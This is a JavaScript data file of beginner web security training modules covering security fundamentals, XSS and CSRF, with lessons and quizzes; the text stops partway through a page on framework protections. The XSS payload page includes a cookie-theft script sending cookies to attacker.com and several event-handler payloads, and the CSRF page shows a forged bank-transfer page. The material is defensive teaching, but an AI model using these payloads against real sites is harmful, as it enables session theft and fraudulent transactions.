// Web Application Security Training Modules
// Each category has 2 modules per difficulty level (beginner, intermediate, advanced)

const webSecurityModules = [
  // BEGINNER LEVEL - 2 modules
  {
    title: "Web Security Fundamentals",
    description: "Introduction to web application security concepts, basic vulnerabilities, and security principles.",
    category: "web-security",
    difficulty: "beginner",
    duration: 120,
    overview: {
      objectives: [
        "Understand fundamental web security concepts",
        "Identify common web vulnerabilities",
        "Learn basic security principles",
        "Understand the CIA triad in web context"
      ],
      prerequisites: [
        "Basic understanding of web technologies (HTML, HTTP)",
        "Familiarity with web browsers and web applications"
      ],
      outcomes: [
        "Can identify basic security vulnerabilities",
        "Understands security principles and terminology",
        "Can apply basic security measures"
      ]
    },
    pages: [
      {
        title: "Introduction to Web Security",
        content: `# Introduction to Web Security

Web application security is a critical aspect of modern software development. As more applications move online and handle sensitive data, protecting against cyber threats becomes essential.

## What is Web Application Security?

Web application security involves protecting websites, web applications, and web services from various cyber threats that could compromise data integrity, confidentiality, and availability.

## Why Web Security Matters

- **Data Protection**: Safeguard user information and sensitive business data
- **Trust Building**: Maintain user confidence and business reputation
- **Compliance**: Meet regulatory requirements (GDPR, HIPAA, PCI-DSS)
- **Business Continuity**: Prevent disruptions and financial losses
- **Legal Liability**: Avoid legal consequences of data breaches`,
        pageNumber: 1,
        type: "introduction",
        keyPoints: [
          "Web security protects against cyber threats",
          "Essential for data protection and compliance",
          "Builds trust and maintains business reputation",
          "Critical for business continuity"
        ],
        additionalResources: [
          {
            title: "OWASP Foundation",
            url: "https://owasp.org/",
            type: "documentation"
          }
        ]
      },
      {
        title: "The CIA Triad",
        content: `# The CIA Triad in Web Security

The CIA Triad is the foundation of information security, consisting of three core principles:

## Confidentiality
Ensures that sensitive information is accessible only to authorized individuals, entities, or processes.

**In Web Context:**
- User authentication and authorization
- Data encryption in transit and at rest
- Access control mechanisms
- Secure session management

## Integrity
Ensures that data remains accurate, complete, and unaltered during storage, transmission, or processing.

**In Web Context:**
- Input validation and sanitization
- Digital signatures and checksums
- Secure coding practices
- Database integrity constraints

## Availability
Ensures that systems, applications, and data are accessible and usable when needed by authorized users.

**In Web Context:**
- DDoS protection
- Load balancing and redundancy
- Regular backups
- System monitoring and maintenance`,
        pageNumber: 2,
        type: "theory",
        keyPoints: [
          "Confidentiality protects sensitive information",
          "Integrity ensures data accuracy",
          "Availability maintains system accessibility",
          "All three principles must work together"
        ]
      },
      {
        title: "Common Web Vulnerabilities Overview",
        content: `# Common Web Vulnerabilities

Understanding common vulnerabilities is crucial for building secure web applications.

## OWASP Top 10 Overview

The OWASP Top 10 represents the most critical security risks to web applications:

1. **Injection** - SQL, NoSQL, OS, and LDAP injection flaws
2. **Broken Authentication** - Authentication and session management flaws
3. **Sensitive Data Exposure** - Inadequate protection of sensitive data
4. **XML External Entities (XXE)** - Poorly configured XML processors
5. **Broken Access Control** - Improper access restrictions
6. **Security Misconfiguration** - Insecure default configurations
7. **Cross-Site Scripting (XSS)** - Client-side code injection
8. **Insecure Deserialization** - Flaws in deserialization processes
9. **Using Components with Known Vulnerabilities** - Outdated libraries
10. **Insufficient Logging & Monitoring** - Inadequate detection capabilities

## Impact of Vulnerabilities

- **Data Breaches**: Exposure of sensitive information
- **Financial Loss**: Direct costs and regulatory fines
- **Reputation Damage**: Loss of customer trust
- **Business Disruption**: System downtime and recovery costs`,
        pageNumber: 3,
        type: "theory",
        keyPoints: [
          "OWASP Top 10 identifies critical web security risks",
          "Vulnerabilities can lead to data breaches",
          "Impact includes financial and reputation damage",
          "Regular assessment and mitigation are essential"
        ],
        additionalResources: [
          {
            title: "OWASP Top 10 2021",
            url: "https://owasp.org/Top10/",
            type: "documentation"
          }
        ]
      },
      {
        title: "HTTP Security Basics",
        content: `# HTTP Security Fundamentals

HTTP (Hypertext Transfer Protocol) is the foundation of web communication. Understanding its security aspects is crucial.

## HTTP vs HTTPS

### HTTP (Hypertext Transfer Protocol)
- Plain text communication
- No encryption
- Vulnerable to eavesdropping
- Default port: 80

### HTTPS (HTTP Secure)
- Encrypted communication using TLS/SSL
- Protects against eavesdropping and tampering
- Authenticates the server
- Default port: 443

## Important HTTP Headers

### Security-Related Headers

**X-Content-Type-Options: nosniff**
- Prevents MIME type sniffing attacks
- Forces browsers to respect declared content types

**X-Frame-Options: DENY**
- Prevents clickjacking attacks
- Controls iframe embedding

**Content-Security-Policy**
- Prevents XSS and data injection attacks
- Controls resource loading sources

**Strict-Transport-Security**
- Forces HTTPS connections
- Prevents protocol downgrade attacks`,
        pageNumber: 4,
        type: "theory",
        codeExamples: [
          {
            language: "http",
            code: `// Example security headers
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'`,
            description: "Common security headers"
          }
        ],
        keyPoints: [
          "HTTPS encrypts communication between client and server",
          "Security headers provide additional protection",
          "HTTP headers can prevent various attack vectors",
          "Always use HTTPS in production environments"
        ]
      },
      {
        title: "Authentication vs Authorization",
        content: `# Authentication vs Authorization

Two fundamental concepts in web security that are often confused but serve different purposes.

## Authentication
**"Who are you?"**

The process of verifying the identity of a user, device, or system.

### Common Authentication Methods:
- **Username/Password**: Traditional credentials
- **Multi-Factor Authentication (MFA)**: Multiple verification factors
- **Biometrics**: Fingerprints, facial recognition
- **Token-based**: JWT, OAuth tokens
- **Certificate-based**: Digital certificates

### Authentication Factors:
1. **Something you know** (passwords, PINs)
2. **Something you have** (tokens, smartphones)
3. **Something you are** (biometrics)

## Authorization
**"What can you do?"**

The process of granting or denying access to specific resources or actions based on authenticated identity.

### Authorization Models:
- **Role-Based Access Control (RBAC)**: Access based on user roles
- **Attribute-Based Access Control (ABAC)**: Access based on attributes
- **Access Control Lists (ACL)**: Explicit permissions per resource

## Key Differences

| Authentication | Authorization |
|----------------|---------------|
| Verifies identity | Grants permissions |
| Happens first | Happens after authentication |
| Who are you? | What can you access? |
| Login process | Access control |`,
        pageNumber: 5,
        type: "theory",
        keyPoints: [
          "Authentication verifies identity",
          "Authorization grants permissions",
          "Authentication comes before authorization",
          "Both are essential for secure systems"
        ]
      },
      {
        title: "Input Validation Basics",
        content: `# Input Validation Fundamentals

Input validation is a critical security control that ensures data integrity and prevents many types of attacks.

## What is Input Validation?

The process of ensuring that input data meets the expected format, type, length, and range before processing.

## Types of Input Validation

### Client-Side Validation
- Improves user experience
- Reduces server load
- **Should never be the only validation**
- Can be bypassed easily

### Server-Side Validation
- Mandatory for security
- Final line of defense
- Cannot be bypassed by users
- Should validate all inputs

## Validation Strategies

### Whitelist Validation (Preferred)
- Define what is allowed
- Reject everything else
- More secure approach
- Example: Only allow letters and numbers for usernames

### Blacklist Validation
- Define what is not allowed
- Allow everything else
- Less secure approach
- Easy to bypass with variations

## Common Input Types to Validate

1. **Form Data**: User inputs from web forms
2. **URL Parameters**: Query string parameters
3. **HTTP Headers**: Custom and standard headers
4. **File Uploads**: File type, size, content validation
5. **API Requests**: JSON/XML payloads`,
        pageNumber: 6,
        type: "theory",
        codeExamples: [
          {
            language: "javascript",
            code: `// Example input validation
function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

function validateUsername(username) {
  // Whitelist: only alphanumeric characters, 3-20 length
  const usernameRegex = /^[a-zA-Z0-9]{3,20}$/;
  return usernameRegex.test(username);
}`,
            description: "Basic input validation examples"
          }
        ],
        keyPoints: [
          "Validate all input on the server side",
          "Use whitelist validation when possible",
          "Client-side validation is for UX, not security",
          "Validate format, type, length, and range"
        ]
      },
      {
        title: "Password Security Best Practices",
        content: `# Password Security Best Practices

Passwords remain a primary authentication method, making their security crucial for overall system security.

## Password Requirements

### Minimum Standards:
- **Length**: At least 8 characters (12+ recommended)
- **Complexity**: Mix of uppercase, lowercase, numbers, and symbols
- **Uniqueness**: Different password for each account
- **No Personal Information**: Avoid names, birthdays, common words

### Modern Approaches:
- **Passphrases**: Long, memorable phrases
- **Password Managers**: Generate and store unique passwords
- **Multi-Factor Authentication**: Add extra security layers

## Password Storage

### Never Store Passwords in Plain Text!

### Secure Storage Methods:

1. **Hashing with Salt**
   - Use strong hashing algorithms (bcrypt, scrypt, Argon2)
   - Add unique salt for each password
   - Use appropriate work factors/iterations

2. **Key Stretching**
   - Make brute force attacks time-consuming
   - Adjust iterations based on current computing power

## Password Attacks

### Common Attack Methods:
- **Brute Force**: Trying all possible combinations
- **Dictionary Attacks**: Using common passwords
- **Rainbow Tables**: Pre-computed hash lookups
- **Credential Stuffing**: Using leaked passwords from other breaches

### Protection Strategies:
- Rate limiting failed attempts
- Account lockout mechanisms
- CAPTCHA after multiple failures
- Monitoring for suspicious activity`,
        pageNumber: 7,
        type: "theory",
        codeExamples: [
          {
            language: "javascript",
            code: `const bcrypt = require('bcrypt');

// Hashing a password
async function hashPassword(plainPassword) {
  const saltRounds = 12;
  const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
  return hashedPassword;
}

// Verifying a password
async function verifyPassword(plainPassword, hashedPassword) {
  const isMatch = await bcrypt.compare(plainPassword, hashedPassword);
  return isMatch;
}`,
            description: "Secure password hashing with bcrypt"
          }
        ],
        keyPoints: [
          "Never store passwords in plain text",
          "Use strong hashing algorithms with salt",
          "Implement rate limiting and account lockout",
          "Encourage strong passwords and MFA"
        ]
      },
      {
        title: "Session Management Basics",
        content: `# Session Management Fundamentals

Session management is crucial for maintaining user state and security in web applications.

## What are Sessions?

Sessions maintain state between HTTP requests, allowing applications to remember user authentication and preferences.

## Session Components

### Session ID
- Unique identifier for each session
- Should be cryptographically random
- Sufficient length to prevent guessing
- Changed after authentication

### Session Storage
- **Server-side**: Session data stored on server
- **Client-side**: Session data stored in cookies/tokens
- **Database**: Persistent session storage
- **Memory**: Fast but non-persistent storage

## Session Security Best Practices

### Session ID Security
1. **Use cryptographically secure random generation**
2. **Sufficient entropy** (at least 128 bits)
3. **Regenerate after login** to prevent session fixation
4. **Use HTTPS only** to prevent interception

### Cookie Security Flags
- **Secure**: Only send over HTTPS
- **HttpOnly**: Prevent JavaScript access
- **SameSite**: Control cross-site request handling

### Session Timeout
- **Idle timeout**: Expire after inactivity
- **Absolute timeout**: Maximum session duration
- **Sensitive operations**: Re-authentication required

## Common Session Attacks

### Session Hijacking
- Attacker steals valid session ID
- Prevention: HTTPS, secure cookies, IP binding

### Session Fixation
- Attacker sets known session ID
- Prevention: Regenerate session ID after login

### Cross-Site Request Forgery (CSRF)
- Unauthorized actions using valid session
- Prevention: CSRF tokens, SameSite cookies`,
        pageNumber: 8,
        type: "theory",
        codeExamples: [
          {
            language: "javascript",
            code: `// Express.js session configuration
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,     // HTTPS only
    httpOnly: true,   // Prevent XSS
    maxAge: 1800000,  // 30 minutes
    sameSite: 'strict' // CSRF protection
  }
}));`,
            description: "Secure session configuration"
          }
        ],
        keyPoints: [
          "Sessions maintain state between requests",
          "Use secure, random session IDs",
          "Implement proper timeout policies",
          "Regenerate session IDs after authentication"
        ]
      },
      {
        title: "Basic Security Headers",
        content: `# Essential Security Headers

HTTP security headers provide an additional layer of protection for web applications.

## Content Security Policy (CSP)

Prevents XSS attacks by controlling resource loading.

### Basic CSP Directives:
- **default-src**: Default policy for all resource types
- **script-src**: Controls JavaScript execution
- **style-src**: Controls CSS loading
- **img-src**: Controls image loading
- **connect-src**: Controls AJAX/WebSocket connections

## X-Frame-Options

Prevents clickjacking attacks by controlling iframe embedding.

### Values:
- **DENY**: Never allow framing
- **SAMEORIGIN**: Allow framing from same origin
- **ALLOW-FROM**: Allow framing from specific origin

## Other Important Headers

### X-Content-Type-Options: nosniff
- Prevents MIME type sniffing
- Forces browsers to respect declared content types

### X-XSS-Protection
- Enables browser XSS filtering
- Value: "1; mode=block"

### Strict-Transport-Security (HSTS)
- Forces HTTPS connections
- Prevents protocol downgrade attacks
- Includes subdomains protection

### Referrer-Policy
- Controls referrer information sent in requests
- Helps protect user privacy`,
        pageNumber: 9,
        type: "theory",
        codeExamples: [
          {
            language: "http",
            code: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin`,
            description: "Complete set of security headers"
          }
        ],
        keyPoints: [
          "Security headers provide defense in depth",
          "CSP prevents XSS attacks",
          "X-Frame-Options prevents clickjacking",
          "HSTS enforces HTTPS connections"
        ]
      },
      {
        title: "Summary and Best Practices",
        content: `# Web Security Fundamentals Summary

## Key Concepts Covered

1. **CIA Triad**: Confidentiality, Integrity, Availability
2. **Common Vulnerabilities**: OWASP Top 10 overview
3. **HTTP Security**: HTTPS, security headers
4. **Authentication vs Authorization**: Identity verification vs access control
5. **Input Validation**: Server-side validation, whitelist approach
6. **Password Security**: Hashing, salting, strong requirements
7. **Session Management**: Secure session handling
8. **Security Headers**: Defense-in-depth protection

## Essential Security Practices

### For Developers:
- Always validate input server-side
- Use HTTPS everywhere
- Implement proper authentication and authorization
- Hash passwords with salt
- Use secure session management
- Apply security headers
- Keep dependencies updated
- Follow the principle of least privilege

### For Organizations:
- Conduct regular security assessments
- Implement security training programs
- Maintain incident response procedures
- Monitor for suspicious activities
- Backup data regularly
- Have a patch management process

## Next Steps

After completing this module, you should:
- Understand fundamental web security concepts
- Be able to identify basic vulnerabilities
- Know how to implement basic security controls
- Be prepared for more advanced security topics

Continue with intermediate modules to dive deeper into specific vulnerability types and advanced protection mechanisms.`,
        pageNumber: 10,
        type: "summary",
        keyPoints: [
          "Security is everyone's responsibility",
          "Defense in depth provides multiple layers of protection",
          "Regular assessment and improvement are essential",
          "Stay updated with latest security threats and practices"
        ],
        additionalResources: [
          {
            title: "OWASP Cheat Sheet Series",
            url: "https://cheatsheetseries.owasp.org/",
            type: "documentation"
          },
          {
            title: "Mozilla Web Security Guidelines",
            url: "https://infosec.mozilla.org/guidelines/web_security",
            type: "documentation"
          }
        ]
      }
    ],
    quiz: {
      questions: [
        {
          question: "What does the 'C' in CIA triad stand for?",
          type: "multiple-choice",
          options: ["Confidentiality", "Consistency", "Compliance", "Capability"],
          correctAnswer: 0,
          explanation: "The CIA triad consists of Confidentiality, Integrity, and Availability.",
          difficulty: "easy",
          points: 1
        },
        {
          question: "Which of the following are part of the OWASP Top 10? (Select all that apply)",
          type: "multiple-select",
          options: ["SQL Injection", "Cross-Site Scripting (XSS)", "Broken Authentication", "Buffer Overflow"],
          correctAnswers: [0, 1, 2],
          explanation: "SQL Injection, XSS, and Broken Authentication are all part of the OWASP Top 10. Buffer Overflow is not specifically listed in the current Top 10.",
          difficulty: "medium",
          points: 2
        },
        {
          question: "HTTPS uses which protocol for encryption?",
          type: "multiple-choice",
          options: ["SSL/TLS", "SSH", "PGP", "MD5"],
          correctAnswer: 0,
          explanation: "HTTPS uses SSL/TLS protocols for encryption and secure communication.",
          difficulty: "easy",
          points: 1
        },
        {
          question: "Authentication comes before authorization in the security process.",
          type: "true-false",
          options: ["True", "False"],
          correctAnswer: 0,
          explanation: "Authentication (verifying identity) must occur before authorization (granting permissions) can take place.",
          difficulty: "easy",
          points: 1
        },
        {
          question: "Which validation approach is considered more secure?",
          type: "multiple-choice",
          options: ["Whitelist validation", "Blacklist validation", "Both are equally secure", "Neither is secure"],
          correctAnswer: 0,
          explanation: "Whitelist validation is more secure because it defines what IS allowed rather than what ISN'T allowed, making it harder to bypass.",
          difficulty: "medium",
          points: 2
        }
      ],
      passingScore: 70,
      timeLimit: 15,
      maxAttempts: 3
    },
    tags: ["fundamentals", "owasp", "http", "authentication", "session-management"],
    isPublished: true
  },

  {
    title: "Introduction to XSS and CSRF",
    description: "Understanding Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks with practical examples and prevention techniques.",
    category: "web-security",
    difficulty: "beginner",
    duration: 90,
    overview: {
      objectives: [
        "Understand XSS attack types and mechanisms",
        "Learn about CSRF attacks and their impact",
        "Identify vulnerable code patterns",
        "Implement basic prevention techniques"
      ],
      prerequisites: [
        "Web Security Fundamentals module",
        "Basic HTML and JavaScript knowledge",
        "Understanding of HTTP requests"
      ],
      outcomes: [
        "Can identify XSS and CSRF vulnerabilities",
        "Knows how to implement basic protections",
        "Understands the impact of these attacks"
      ]
    },
    pages: [
      {
        title: "Understanding Cross-Site Scripting (XSS)",
        content: `# Cross-Site Scripting (XSS) Overview

Cross-Site Scripting (XSS) is one of the most common web application vulnerabilities, ranking high on the OWASP Top 10 list.

## What is XSS?

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in victims' browsers.

## Impact of XSS Attacks

- **Session Hijacking**: Stealing session cookies
- **Credential Theft**: Capturing login information
- **Data Exfiltration**: Accessing sensitive data
- **Malware Distribution**: Redirecting to malicious sites
- **UI Manipulation**: Modifying page content
- **Keylogging**: Recording user keystrokes

## Why XSS is Dangerous

1. **Bypasses Same-Origin Policy**: Scripts run in the context of the trusted site
2. **User Trust Exploitation**: Users trust the legitimate website
3. **Wide Attack Surface**: Many input vectors (forms, URLs, headers)
4. **Client-Side Impact**: Affects user browsers directly

## Real-World XSS Examples

- **Social Media**: Posting malicious scripts in comments
- **E-commerce**: Injecting scripts in product reviews
- **Forums**: Embedding scripts in discussion posts
- **Search Results**: Reflecting malicious input in search pages`,
        pageNumber: 1,
        type: "introduction",
        keyPoints: [
          "XSS allows execution of malicious scripts",
          "Bypasses browser security policies",
          "Can lead to session hijacking and data theft",
          "Common in user-generated content"
        ],
        additionalResources: [
          {
            title: "OWASP XSS Prevention Cheat Sheet",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            type: "documentation"
          }
        ]
      },
      {
        title: "Types of XSS Attacks",
        content: `# Types of XSS Attacks

There are three main types of XSS attacks, each with different characteristics and attack vectors.

## 1. Reflected XSS (Non-Persistent)

The malicious script is reflected off a web server, typically in error messages or search results.

### Characteristics:
- **Non-persistent**: Not stored on the server
- **User-specific**: Affects individual users
- **URL-based**: Often delivered through malicious links
- **Social engineering required**: Victims must click malicious links

### Example Scenario:
A search page that displays: "No results found for: [user input]"
If user input isn't sanitized, scripts can execute.

## 2. Stored XSS (Persistent)

The malicious script is permanently stored on the server (database, file system, etc.) and served to users.

### Characteristics:
- **Persistent**: Stored on server
- **Wide impact**: Affects all users who view the content
- **No social engineering**: Automatic execution
- **Higher severity**: More dangerous than reflected XSS

### Example Scenario:
Comment systems, user profiles, or forums where malicious scripts are stored and displayed to all visitors.

## 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side code.

### Characteristics:
- **Client-side**: Occurs in browser's DOM
- **JavaScript-based**: Involves unsafe JavaScript operations
- **No server involvement**: Payload never reaches server
- **Modern web apps**: Common in AJAX-heavy applications

### Example Scenario:
JavaScript code that directly writes URL parameters to the DOM without validation.`,
        pageNumber: 2,
        type: "theory",
        codeExamples: [
          {
            language: "javascript",
            code: `// Vulnerable DOM-based XSS example
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
// Directly writing to DOM without sanitization
document.getElementById('welcome').innerHTML = 'Welcome ' + name;

// If URL is: site.com?name=<script>alert('XSS')</script>
// The script will execute`,
            description: "Example of vulnerable DOM manipulation"
          }
        ],
        keyPoints: [
          "Reflected XSS requires user interaction",
          "Stored XSS has broader impact",
          "DOM-based XSS occurs client-side",
          "Each type requires different prevention strategies"
        ]
      },
      {
        title: "XSS Attack Vectors and Payloads",
        content: `# XSS Attack Vectors and Common Payloads

Understanding how XSS attacks are crafted helps in building better defenses.

## Common Attack Vectors

### 1. Form Inputs
- Text fields, textareas, hidden fields
- File upload fields
- Search boxes

### 2. URL Parameters
- Query string parameters
- Path parameters
- Fragment identifiers

### 3. HTTP Headers
- User-Agent strings
- Referer headers
- Custom headers

### 4. Cookies
- Cookie values used in page rendering
- Session data display

## Basic XSS Payloads

### Simple Alert Box
Basic payload to test for XSS vulnerability.

### Cookie Theft
Stealing session cookies and sending to attacker's server.

### Redirect Attacks
Redirecting users to malicious websites.

### Keylogger
Recording user keystrokes and form submissions.

## Evasion Techniques

Attackers use various techniques to bypass filters:

### Encoding
- **HTML Encoding**: &#60;script&#62;
- **URL Encoding**: %3Cscript%3E
- **JavaScript Encoding**: \x3Cscript\x3E

### Case Variations
- Mixed case: <ScRiPt>
- Alternative tags: <img>, <svg>, <iframe>

### Event Handlers
- Using HTML event attributes
- Mouse and keyboard events`,
        pageNumber: 3,
        type: "example",
        codeExamples: [
          {
            language: "javascript",
            code: `// Basic XSS payloads (for testing only!)

// Simple alert
<script>alert('XSS')</script>

// Cookie theft
<script>
  var img = new Image();
  img.src = 'https://attacker.com/steal?cookies=' + document.cookie;
</script>

// Using event handlers
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">

// Alternative encoding
<img src=javascript:alert('XSS')>
<iframe src="javascript:alert('XSS')">`,
            description: "Common XSS payloads (educational purposes)"
          }
        ],
        keyPoints: [
          "Multiple attack vectors exist",
          "Attackers use encoding to bypass filters",
          "Event handlers provide alternative injection points",
          "Payloads can be obfuscated in many ways"
        ]
      },
      {
        title: "XSS Prevention Techniques",
        content: `# Preventing XSS Attacks

Multiple layers of defense are needed to effectively prevent XSS attacks.

## 1. Input Validation

### Server-Side Validation
- Validate all input on the server
- Use whitelist approach when possible
- Reject malicious patterns
- Validate data type, length, and format

### Input Sanitization
- Remove or encode dangerous characters
- Use established libraries
- Context-aware sanitization

## 2. Output Encoding

### HTML Entity Encoding
Convert special characters to HTML entities before displaying.

**Key Characters to Encode:**
- \`<\` → \`&lt;\`
- \`>\` → \`&gt;\`
- \`"\` → \`&quot;\`
- \`'\` → \`&#x27;\`
- \`&\` → \`&amp;\`

### Context-Aware Encoding
Different contexts require different encoding:
- **HTML Context**: HTML entity encoding
- **JavaScript Context**: JavaScript encoding
- **URL Context**: URL encoding
- **CSS Context**: CSS encoding

## 3. Content Security Policy (CSP)

CSP provides a powerful defense against XSS by controlling resource loading.

### Basic CSP Implementation
- Define allowed sources for scripts, styles, images
- Block inline scripts and styles
- Report violations

### CSP Directives
- \`script-src\`: Control JavaScript execution
- \`style-src\`: Control CSS loading
- \`img-src\`: Control image loading
- \`default-src\`: Default policy for all resources

## 4. Security Headers

Additional headers that help prevent XSS:
- \`X-XSS-Protection\`: Enable browser XSS filtering
- \`X-Content-Type-Options\`: Prevent MIME sniffing
- \`X-Frame-Options\`: Prevent clickjacking`,
        pageNumber: 4,
        type: "theory",
        codeExamples: [
          {
            language: "javascript",
            code: `// Output encoding example (Node.js)
function htmlEncode(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Using a library (recommended)
const validator = require('validator');
const encoded = validator.escape(userInput);

// CSP header example
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});`,
            description: "XSS prevention implementation examples"
          }
        ],
        keyPoints: [
          "Always validate and sanitize input",
          "Use context-aware output encoding",
          "Implement CSP for additional protection",
          "Apply defense in depth principles"
        ]
      },
      {
        title: "Understanding CSRF Attacks",
        content: `# Cross-Site Request Forgery (CSRF)

CSRF is an attack that forces end users to execute unwanted actions on a web application in which they're authenticated.

## What is CSRF?

CSRF exploits the trust a web application has in a user's browser. If a user is authenticated to a website, the browser will automatically include authentication cookies with requests to that site.

## How CSRF Works

1. **User authenticates** to legitimate website
2. **Browser stores** session cookie
3. **User visits** malicious website (while still authenticated)
4. **Malicious site** sends forged requests to legitimate site
5. **Browser automatically** includes authentication cookies
6. **Legitimate site** processes the request as if user intended it

## CSRF Attack Requirements

For a successful CSRF attack:
- **User must be authenticated** to the target application
- **Attacker must know** the structure of requests
- **Request must not require** unpredictable parameters
- **Application must rely** on automatic authentication (cookies)

## Impact of CSRF Attacks

- **Financial fraud**: Unauthorized money transfers
- **Account takeover**: Changing passwords or email
- **Data modification**: Altering user profiles
- **Privilege escalation**: Adding admin users
- **Social engineering**: Posting malicious content

## Real-World CSRF Examples

### Banking Application
Malicious site triggers money transfer request using victim's authenticated session.

### Social Media
Automatically posting spam or malicious links to victim's profile.

### E-commerce
Adding items to cart or completing purchases without user consent.

### Admin Panels
Creating new admin accounts or modifying system settings.`,
        pageNumber: 5,
        type: "theory",
        keyPoints: [
          "CSRF exploits trust between browser and website",
          "Requires user to be authenticated",
          "Can lead to unauthorized actions",
          "Automatic cookie submission enables attacks"
        ]
      },
      {
        title: "CSRF Attack Examples",
        content: `# CSRF Attack Scenarios and Examples

Understanding practical CSRF attack scenarios helps in building better defenses.

## Simple CSRF Attack

### Vulnerable Application
A banking application that processes money transfers via GET request.

### Attack Vector
Attacker creates a malicious webpage that automatically triggers the transfer request.

## Advanced CSRF Techniques

### Hidden Form Submission
Using JavaScript to automatically submit hidden forms to the target application.

### Image-Based CSRF
Using image tags to trigger GET-based CSRF attacks automatically when page loads.

### AJAX-Based CSRF
More sophisticated attacks using XMLHttpRequest for complex operations.

## CSRF in Different HTTP Methods

### GET-Based CSRF
- Simplest to execute
- Can be triggered by images, links, or iframes
- Should never be used for state-changing operations

### POST-Based CSRF
- Requires form submission or AJAX
- More complex but still achievable
- Common in applications that don't use CSRF tokens

### PUT/DELETE CSRF
- Less common but possible
- Requires AJAX or form with method override
- Can be devastating in REST APIs

## Detection Techniques

### Manual Testing
- Remove CSRF tokens and replay requests
- Use different user's tokens
- Test with empty or invalid tokens

### Automated Testing
- Burp Suite CSRF scanner
- OWASP ZAP CSRF testing
- Custom scripts for token validation`,
        pageNumber: 6,
        type: "example",
        codeExamples: [
          {
            language: "html",
            code: `<!-- Simple CSRF attack example -->
<!-- Malicious webpage that triggers money transfer -->
<html>
<body>
  <!-- Invisible image that triggers the CSRF attack -->
  <img src="https://bank.com/transfer?to=attacker&amount=1000" 
       width="1" height="1" style="display:none">
  
  <!-- Or using a hidden form -->
  <form id="csrfForm" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  
  <script>
    // Auto-submit the form
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>`,
            description: "Example CSRF attack vectors"
          }
        ],
        keyPoints: [
          "CSRF can be triggered through various HTML elements",
          "Both GET and POST requests can be exploited",
          "Attacks can be completely transparent to users",
          "Testing should cover all HTTP methods"
        ]
      },
      {
        title: "CSRF Prevention Techniques",
        content: `# Preventing CSRF Attacks

Multiple defense mechanisms can be implemented to protect against CSRF attacks.

## 1. CSRF Tokens (Primary Defense)

### Synchronizer Token Pattern
- Generate unique, unpredictable token for each session/request
- Include token in all state-changing forms
- Validate token on server before processing request
- Reject requests with missing or invalid tokens

### Token Generation Requirements
- **Cryptographically secure**: Use secure random generators
- **Sufficient entropy**: At least 128 bits of randomness
- **Unique per session**: Different token for each user session
- **Time-limited**: Optional token expiration

## 2. SameSite Cookie Attribute

Modern browsers support SameSite attribute for cookies:

### SameSite Values:
- **Strict**: Cookie never sent in cross-site requests
- **Lax**: Cookie sent with top-level navigations (links)
- **None**: Cookie sent with all cross-site requests (requires Secure)

## 3. Custom Headers

### X-Requested-With Header
- Add custom header to AJAX requests
- Simple requests become preflight requests
- CORS prevents cross-origin custom headers

### Custom Token Headers
- Send CSRF token in custom header instead of form field
- More resistant to some attack scenarios

## 4. Double Submit Cookie Pattern

- Store CSRF token in both cookie and request parameter
- Verify both values match on server
- Useful when server-side state is limited

## 5. Origin and Referer Validation

### Origin Header Validation
- Check that Origin header matches expected values
- More reliable than Referer header
- May not be present in all requests

### Referer Header Validation
- Verify request came from expected page
- Can be spoofed or stripped by browsers/proxies
- Should be used as additional defense only`,
        pageNumber: 7,
        type: "theory",
        codeExamples: [
          {
            language: "javascript",
            code: `// CSRF token generation and validation (Node.js/Express)
const crypto = require('crypto');

// Generate CSRF token
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware to add CSRF token to session
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Validate CSRF token
function validateCSRF(req, res, next) {
  const token = req.body.csrfToken || req.headers['x-csrf-token'];
  if (token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

// SameSite cookie configuration
app.use(session({
  cookie: {
    sameSite: 'strict',
    secure: true, // HTTPS only
    httpOnly: true
  }
}));`,
            description: "CSRF protection implementation"
          }
        ],
        keyPoints: [
          "CSRF tokens are the primary defense mechanism",
          "SameSite cookies provide additional protection",
          "Custom headers can prevent simple CSRF attacks",
          "Multiple defenses provide better security"
        ]
      },
      {
        title: "Implementing XSS and CSRF Protections",
        content: `# Practical Implementation Guide

Let's look at how to implement XSS and CSRF protections in real applications.

## Framework-Specific Protections

### React.js
- **Automatic escaping**: JSX automatically escapes content
- **dangerouslySetInnerHTML**: Only use with sanitized content
- **Libraries**: Use DOMPurify for HTML sanitization

### Angular
- **Built-in sanitization**: Angular sanitizes untrusted values
- **Template security**: Templates are trusted by default
- **HTTP client**: Built-in CSRF protection

### Django
- **Template auto-escaping**: Templates escape content by default
- **CSRF middleware**: Built-in CSRF token validation
- **Safe filters**: |safe filter bypasses escaping

### Express.js
- **Helmet.js**: Security middleware collection
